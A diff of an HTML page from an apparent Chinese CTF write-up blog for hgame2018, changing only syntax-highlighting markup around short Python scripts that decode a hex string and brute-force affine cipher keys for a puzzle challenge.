+</span><span style="color:#bf616a;">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">yigb/+l/vjDdAgMBAAE</span><span style="color:#c0c5ce;">=</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">-----END</span><span style="color:#c0c5ce;"> PUBLIC KEY-----</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">writing</span><span style="color:#c0c5ce;"> RSA key</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
 </span></code></pre>
 <p>256位嘛，好说了</p>
 <p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180212_150022.png" alt="The same simple RSA" /></p>
@@ -305,19 +305,19 @@ yigb/+l/vjDdAgMBAAE</span><span style="color:#c0c5ce;">=
 <p>要分析的话，就是指数重叠+频率分析？</p>
 <h2 id="violence">violence</h2>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#c0c5ce;">a = &quot;</span><span style="color:#a3be8c;">191709050607090519_0706_0603150519_03_0a0706_170c_1407170205101105</span><span style="color:#c0c5ce;">&quot;
-a = a.</span><span style="color:#bf616a;">replace</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">_</span><span style="color:#c0c5ce;">&#39;,&#39;&#39;)
-str = &quot;&quot;
-</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,</span><span style="color:#bf616a;">int</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(a)/</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">)):
-	str+=</span><span style="color:#96b5b4;">chr</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">ord</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;)+</span><span style="color:#bf616a;">int</span><span style="color:#c0c5ce;">(a[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">*i]+a[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">*i+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">],</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">))
-</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(str)
+<code><span style="color:#c0c5ce;">a = &quot;</span><span style="color:#a3be8c;">191709050607090519_0706_0603150519_03_0a0706_170c_1407170205101105</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
+a = a.</span><span style="color:#bf616a;">replace</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">_</span><span style="color:#c0c5ce;">&#39;,&#39;&#39;)</span><span style="color:#c0c5ce;">
+str = &quot;&quot;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,</span><span style="color:#bf616a;">int</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(a)/</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">)):</span><span style="color:#c0c5ce;">
+	str+=</span><span style="color:#96b5b4;">chr</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">ord</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;)+</span><span style="color:#bf616a;">int</span><span style="color:#c0c5ce;">(a[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">*i]+a[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">*i+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">],</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">))</span><span style="color:#c0c5ce;">
+</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(str)</span><span style="color:#c0c5ce;">
 </span></code></pre><pre style="background-color:#2b303b;">
-<code><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pycipher </span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">Affine
-
-s = [</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">9</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">11</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">15</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">17</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">19</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">21</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">23</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">25</span><span style="color:#c0c5ce;">]
-</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#c0c5ce;">s:
-	</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">j </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">25</span><span style="color:#c0c5ce;">):
-		</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">Affine</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">a</span><span style="color:#c0c5ce;">=i,</span><span style="color:#bf616a;">b</span><span style="color:#c0c5ce;">=j).</span><span style="color:#bf616a;">encipher</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">zxjfghjfzhggdvfzdkhgxmuhxcfqrf</span><span style="color:#c0c5ce;">&#39;).</span><span style="color:#bf616a;">lower</span><span style="color:#c0c5ce;">())
+<code><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pycipher </span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">Affine</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+s = [</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">9</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">11</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">15</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">17</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">19</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">21</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">23</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">25</span><span style="color:#c0c5ce;">]</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#c0c5ce;">s:</span><span style="color:#c0c5ce;">
+	</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">j </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">25</span><span style="color:#c0c5ce;">):</span><span style="color:#c0c5ce;">
+		</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">Affine</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">a</span><span style="color:#c0c5ce;">=i,</span><span style="color:#bf616a;">b</span><span style="color:#c0c5ce;">=j).</span><span style="color:#bf616a;">encipher</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">zxjfghjfzhggdvfzdkhgxmuhxcfqrf</span><span style="color:#c0c5ce;">&#39;).</span><span style="color:#bf616a;">lower</span><span style="color:#c0c5ce;">())</span><span style="color:#c0c5ce;">
 </span></code></pre>
 <p>然后找到</p>
 <p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180211_220623.png" alt="violence" /></p>
@@ -336,7 +336,7 @@ s = [</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,<
                 src="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;img&#x2F;avatar.png"
                 alt="CSUwangj" />
               
-              <p class="site-author-name">CSUwangj</p>
+              <p class="site-author-name unselectable">CSUwangj</p>
               <p class="site-author-quote">Just keep in mind that hacking is very rarely in a sequence.</p>
             </div>
             <div class="feed-link">
